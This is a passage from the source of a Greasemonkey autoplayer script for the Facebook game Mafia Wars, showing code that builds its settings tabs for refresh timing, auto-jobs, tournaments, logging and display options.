    eltA = makeElement('a', eltCol, {'href':'#','class':'updateButton','alt':'update','title':'update'});
    eltA.addEventListener('click', updateScript, false);
  } else {
    eltCol = makeElement('li', eltRow, {'style':'width:152px;height:70px;'});
    elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r5_c4.png','style':'width:152px;height:70px;'});
  }

  //PS MWAP Save Settings button
  eltCol = makeElement('li', eltRow);
  eltA = makeElement('a', eltCol, {'href':'#','class':'saveButton','alt':'save settings','title':'save settings'});
  eltA.addEventListener('click', saveSettings, false);

  eltCol = makeElement('li', eltRow);
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r5_c16.png','style':'width:20px;height:70px;'});

  // This creates the settings 'table' - last row - footer
  eltRow = makeElement('ul', MWAPSettingsBox, {'style':'height:15px;'});

  eltCol = makeElement('li', eltRow, {'style':'width:18px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r6_c1.png','style':'width:18px;height:15px;'});

  eltCol = makeElement('li', eltRow, {'style':'width:762px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r6_c2.png','style':'width:762px;height:15px;'});

  eltCol = makeElement('li', eltRow, {'style':'width:20px;height:15px;'});
  elt = makeElement('img', eltCol, {'src':'http://www.playerscripts.co.uk/images/mwap_graphics/setlog/mwap_int_web_r6_c16.png','style':'width:20px;height:15px;'});

  //End settings box

  createDynamicDrive();
}

// Create Dynamic Drive Script
function createDynamicDrive() {
  var ddriveElt = document.getElementById('ddriveCode');
  if (ddriveElt) ddriveElt.parentNode.removeChild(ddriveElt);

  // Tab code from: http://www.dynamicdrive.com/dynamicindex17/tabcontent.htm converted into a data URI
  makeElement('script', document.getElementsByTagName('head')[0], {'id':'ddriveCode','type':'text/javascript'})
    .appendChild(document.createTextNode(decode64(tabURI) + '\n' +
    ' /***********************************************\n' +
    ' /*** Tab Content script v2.2- Dynamic Drive DHTML code library (www.dynamicdrive.com)\n' +
    ' /*** This notice MUST stay intact for legal use\n' +
    ' /*** Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code\n' +
    ' ***********************************************/\n' +
    ' var tabs=new ddtabcontent("tabNav"); //enter ID of Tab Container\n' +
    ' tabs.setpersist(true); //toogle persistence of the tabs\' state\n' +
    ' tabs.setselectedClassTarget("linkparent"); //"link" or "linkparent"\n' +
    ' tabs.init();'
  ));
}

// Create General Tab
function createGeneralTab() {
  var elt, title, id, label, item, i, lhs, rhs, choice;

  var generalTab = makeElement('div', null, {'id':'generalTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', generalTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('General Settings:'));

  // Container for a list of settings.
  var list = makeElement('div', generalTab, {'style':'position: relative; top: 10px; margin-left: auto; margin-right: auto; width: 100%; line-height:120%;'});

  // Refresh option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this to refresh PS MWAP between the indicated time interval.';
  id = 'autoClick';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('img', lhs, {'style':'padding-left: 5px;','src':stripURI(energyIcon)});
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Refresh every:'));

  makeElement('input', rhs, {'type':'text', 'title':'Low refresh rate, has to be >= 8','value':GM_getValue('r1', '30'), 'id':'r1', 'size':'1'});
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' to '));
  makeElement('input', rhs, {'type':'text', 'title':'High refresh rate, has to be >= 8','value':GM_getValue('r2', '110'), 'id':'r2', 'size':'1'});
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(' seconds '));

  // Delay option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Set the delay interval between actions.';
  label = makeElement('label', lhs, {'title':title});
  label.appendChild(document.createTextNode('Delay between actions:'));

  makeElement('input', rhs, {'type':'text', 'title':'Low delay rate, has to be >= 1', 'value':GM_getValue('d1', '3'), 'id':'d1', 'size':'1'});
  rhs.appendChild(document.createTextNode(' to '));
  makeElement('input', rhs, {'type':'text', 'title':'High delay rate, has to be >= 2', 'value':GM_getValue('d2', '5'), 'id':'d2', 'size':'1'});
  rhs.appendChild(document.createTextNode(' seconds'));

  // Auto-pause
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this to enable auto-pause before or after level up.';
  id = 'autoPause';
  var autoPause = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Enable auto-pause:'));
  autoPause.addEventListener('click', clickAutoPause, false);

  id = 'autoPauseBefore';
  title = ' Before level up ';
  makeElement('input', rhs, {'type':'radio', 'name':'r3', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  id = 'autoPauseAfter';
  title = ' After level up ';
  makeElement('input', rhs, {'type':'radio', 'name':'r3', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoPauseExp';
  rhs.appendChild(document.createTextNode('Experience left to pause at: '));
  makeElement('input', rhs, {'style':'text-align: right;','type':'text', 'value':GM_getValue(id, '50'), 'id':id, 'size':'2'});

  // Idle-in location
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to idle in preferred city';
  id = 'idleInCity';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' When idle, fly to:'));
  var idleLocation = makeElement('select', rhs, {'id':'idleLocation'});
  for (i = 0, iLength=cities.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(cities[i][CITY_NAME]));
    idleLocation.appendChild(choice);
  }
  idleLocation.selectedIndex = GM_getValue('idleLocation', NY);

  // Auto-lotto
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoLottoOpt';
  title = ' Play the Daily Chance';
  lottoTitle = 'Play free auto-generated lottery ticket daily'
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':lottoTitle}).appendChild(document.createTextNode(title));

  // Lotto selector
  title = ' Collect Daily Chance bonus at: '
  id = 'autoLottoBonus';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  id = 'autoLottoList';
  var lottoBonusSelect = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength = autoLottoBonusList.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(autoLottoBonusList[i]));
    lottoBonusSelect.appendChild(choice);
  }
  lottoBonusSelect.selectedIndex = GM_getValue('autoLottoBonusItem', 0);

  // Burn option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to prioritize burning of either energy or stamina';
  id = 'burnFirst';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Spend all:'));
  var burnOpt = makeElement('select', rhs, {'id':'burnOption'});
  for (i = 0, iLength=burnModes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(burnModes[i]));
    burnOpt.appendChild(choice);
  }
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' first if both are not maxed'));
  burnOpt.selectedIndex = GM_getValue('burnOption', BURN_ENERGY);

  // Featured jobs
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to automatically perform featured jobs';
  id = 'featJob';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Perform featured jobs:'));
  var featJobs = makeElement('select', rhs, {'id':'featJobIndex'});
  for (i = 0, iLength=featJobNames.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(featJobNames[i]));
    featJobs.appendChild(choice);
  }
  featJobs.selectedIndex = GM_getValue('featJobIndex', 0);

  // auto tournament
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check to automatically perform Tournament in Las Vegas';
  id = 'autoTournament';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Perform autoTournament:'));
  var classesElt = makeElement('select', rhs, {'id':'autoTournamentClass','title':'Choose the weight class'});
  for (i = 0, iLength=tournamentClasses.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(tournamentClasses[i][1] + ' (min mafia: ' + tournamentClasses[i][2] + ')')); //', max xp: ' + tournamentClasses[i][3]));
    classesElt.appendChild(choice);
  }
  classesElt.selectedIndex = GM_getValue('autoTournamentClass', 0);

  // Choose Sides
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  makeElement('label', lhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Choose sides:'));

  for (i = 0, iLength=cities.length; i < iLength; ++i) {
    var sideOpt;
    if (cities[i][CITY_SIDES].length > 0) {
      id = cities[i][CITY_SIDE_NAME];
      makeElement('label', rhs).appendChild(document.createTextNode(' ' + cities[i][CITY_NAME] + ' '));
      sideOpt = makeElement('select', rhs, {'id':id});

      for (var j = 0, jLength = cities[i][CITY_SIDES].length; j < jLength; ++j) {
        choice = document.createElement('option');
        choice.value = j;
        choice.appendChild(document.createTextNode(cities[i][CITY_SIDES][j]));
        sideOpt.appendChild(choice);
      }

      sideOpt.selectedIndex = GM_getValue(id, 0);
    }
  }

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'useSecretStashItems';
  title = ' Use Secret Stash Patterns';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 6em;', 'id':'secretStashItems', 'title':'Enter each pattern on a separate line.'}).appendChild(document.createTextNode(GM_getValue('secretStashItems', defaultSecretStashes.join('\n'))));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each pattern on a separate line.'));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoProcessPopups';
  title = ' Try to process all popups when PS MWAP is running';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoDailyTake';
  title = ' Auto-Collect the Daily Take';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id}).appendChild(document.createTextNode(title));

  return generalTab;
}

// Create Display Tab
function createDisplayTab() {
  var title, id, i, item, choice, lhs, rhs;
  var displayTab = makeElement('div', null, {'id':'displayTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', displayTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Display Settings:'));

  // Container for a list of settings.
  var list = makeElement('div', displayTab, {'style':' top: 10px; margin-left: auto; margin-right: auto; width: 100%; line-height:120%;'});

  // Logging option
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'autoLog';
  title = 'Check this to enable logging.';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Enable logging:'));
  id = 'autoLogLength';
  makeElement('input', rhs, {'type':'text', 'id':id, 'value':GM_getValue(id, '300'), 'size':'2', 'style':'text-align: left'});
  rhs.appendChild(document.createTextNode(' max # of messages in log'));

  // Player updates
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'logPlayerUpdates';
  title = 'Send Player Updates to Mafia Log.';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Log Player Updates:'));
  id = 'logPlayerUpdatesMax';
  makeElement('input', rhs, {'type':'text', 'id':id, 'value':GM_getValue(id, '25'), 'size':'2', 'style':'text-align: left'});
  rhs.appendChild(document.createTextNode(' max # of updates'));

  // Log filtering
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check this to enable log filtering';
  id = 'filterLog';
  makeElement('input', lhs, {'type':'checkbox', 'title':title, 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Enable log filtering:'));

  id = 'filterOpt';
  var filterOpt = makeElement('select', rhs, {'id':id});
  var filterOptions = ['Accept patterns','Reject patterns'];
  for (i = 0, iLength=filterOptions.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(filterOptions[i]));
    filterOpt.appendChild(choice);
  }
  filterOpt.selectedIndex = GM_getValue(id, 0);

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'filterPatterns';
  var filterText = makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 7em;', 'id':id, 'title':'Enter each pattern on a separate line.'});
  filterText.appendChild(document.createTextNode(''));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Handle filterMode changes
  var filterHandler = function() {
    var defaultFilter = filterOpt.selectedIndex == 0 ? defaultPassPatterns.join('\n') : defaultFailPatterns.join('\n');
    var fitlerId = filterOpt.selectedIndex == 0 ? 'filterPass' : 'filterFail';
    filterText.firstChild.nodeValue = GM_getValue(fitlerId, defaultFilter);
  };
  filterHandler();
  filterOpt.addEventListener('change', filterHandler, false);

  // Alignment
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'leftAlign';
  title = 'Align game to the left';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Align game to the left'));

  // mw_masthead always on top
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'mastheadOnTop';
  title = 'Enable to elevate PS MWAP-Header (pause/resume/settings etc) so that it\'s always on top';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Elevate PS MWAP-Header'));

  // Set Facebook account to window title
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'fbwindowtitle';
  title = 'Set window title to name on Facebook account';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Set window title to name on Facebook account'));

  // Show Ice status on the fight list page
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'showPulse';
  title = 'Hide iced targets on the fight list page';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Hide iced targets on the fight list page'));

  // Show Level on the hit list page
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'showLevel';
  title = 'Show player level on the hit list page';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Show level on the hit list page'));

  // Hiding MW Game Elements
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  //item = makeElement('div', list, {'class':'single'}); // new row
  makeElement('label', lhs).appendChild(document.createTextNode(' Hide game elements '));

  // Hide Messagecenter Icon
  id = 'hideAll';
  title = 'Hide All MW Icons';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Hide All MW Icons '));

  // Hide Z Banner
  id = 'hideZyngaBanner';
  title = ' Hide Z Promo Banner ';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' MW Promo Banner '));

  return displayTab;
}

// Create Mafia Tab
function createMafiaTab() {
  var elt, title, id, label, item, lhs, rhs, i, choice;
  var mafiaTab = makeElement('div', null, {'id':'mafiaTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', mafiaTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});
  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Mafia Settings:'));

  // Container for a list of settings.
  var list = makeElement('div', mafiaTab, {'style':'position: relative; top: 10px; margin-left: 40px; margin-right: auto; width: 95%; line-height:120%;'});

  // Auto-ask for job help
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Check if you want to ask for help automatically with jobs.';
  id = 'autoAskJobHelp';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title,'value':'checked'}, id);
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Ask for job help at:'));
  title = 'Enter the minimum experience to ask for job help, or 0 for no minimum.';
  id = 'autoAskJobHelpMinExp';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'size':'2'});
  rhs.appendChild(document.createTextNode(' minimum experience'));

//Automatically Ask for Moscow / Bangkok Help
  var selectMoscowTierDiv = makeElement('div', list);
  lhs = makeElement('div', selectMoscowTierDiv, {'class':'lhs'});
  rhs = makeElement('div', selectMoscowTierDiv, {'class':'rhs'});
  makeElement('br', selectMoscowTierDiv, {'class':'hide'});
  title = 'Ask for Help on Moscow Tiers - Be carefull to only choose available Tiers !';
  id = 'selectMoscowTier';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Moscow/Bangkok help:'));
  var selectMoscowTier = makeElement('select', rhs, {'id':id, 'title':title});
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'no Help in Moscow';
  choiceMoscowTier.value = '0';
  if (GM_getValue('selectMoscowTier') == '0') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Baklany';
  choiceMoscowTier.value = '1';
  if (GM_getValue('selectMoscowTier') == '1') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Boets';
  choiceMoscowTier.value = '2';
  if (GM_getValue('selectMoscowTier') == '2') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Brigadir';
  choiceMoscowTier.value = '3';
  if (GM_getValue('selectMoscowTier') == '3') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Avtoritet';
  choiceMoscowTier.value = '4';
  if (GM_getValue('selectMoscowTier') == '4') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Vor';
  choiceMoscowTier.value = '5';
  if (GM_getValue('selectMoscowTier') == '5') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);
  choiceMoscowTier = document.createElement('option');
  choiceMoscowTier.text = 'Pakhan';
  choiceMoscowTier.value = '6';
  if (GM_getValue('selectMoscowTier') == '6') choiceMoscowTier.selected = true;
  selectMoscowTier.appendChild(choiceMoscowTier);

  id = 'selectBangkokTier';
  var selectBangkokTier = makeElement('select', rhs, {'id':id, 'title':title, 'style':'margin-left:0.5em;'});
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'no Help in Bangkok';
  choiceBangkokTier.value = '0';
  if (GM_getValue('selectBangkokTier') == '0') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Brawler';
  choiceBangkokTier.value = '1';
  if (GM_getValue('selectBangkokTier') == '1') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Criminal';
  choiceBangkokTier.value = '2';
  if (GM_getValue('selectBangkokTier') == '2') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Pirate';
  choiceBangkokTier.value = '3';
  if (GM_getValue('selectBangkokTier') == '3') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Commandant';
  choiceBangkokTier.value = '4';
  if (GM_getValue('selectBangkokTier') == '4') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Oyabun';
  choiceBangkokTier.value = '5';
  if (GM_getValue('selectBangkokTier') == '5') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Dragon Head';
  choiceBangkokTier.value = '6';
  if (GM_getValue('selectBangkokTier') == '6') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Saboteur';
  choiceBangkokTier.value = '7';
  if (GM_getValue('selectBangkokTier') == '7') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);
  choiceBangkokTier = document.createElement('option');
  choiceBangkokTier.text = 'Assassin';
  choiceBangkokTier.value = '8';
  if (GM_getValue('selectBangkokTier') == '8') choiceBangkokTier.selected = true;
  selectBangkokTier.appendChild(choiceBangkokTier);

  // Automatically Ask for Vegas / Italy Help
  var selectVegasTierDiv = makeElement('div', list);
  lhs = makeElement('div', selectVegasTierDiv, {'class':'lhs'});
  rhs = makeElement('div', selectVegasTierDiv, {'class':'rhs'});
  makeElement('br', selectVegasTierDiv, {'class':'hide'});
  title = 'Ask for Help on Vegas Tier Jobs - Be carefull to only choose available Jobs / Tiers !';

  id = 'selectVegasTier';
